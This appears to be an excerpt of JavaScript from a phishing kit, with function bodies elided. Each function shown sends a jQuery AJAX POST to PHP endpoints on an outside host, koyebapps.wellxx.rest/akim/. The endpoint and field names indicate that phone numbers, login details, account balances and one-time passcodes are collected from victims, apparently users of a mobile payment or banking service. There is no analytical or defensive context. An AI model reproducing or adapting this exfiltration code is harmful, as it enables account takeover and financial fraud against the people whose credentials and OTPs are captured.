function sendHp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/akim/otpblm.php',
      type: 'POST',
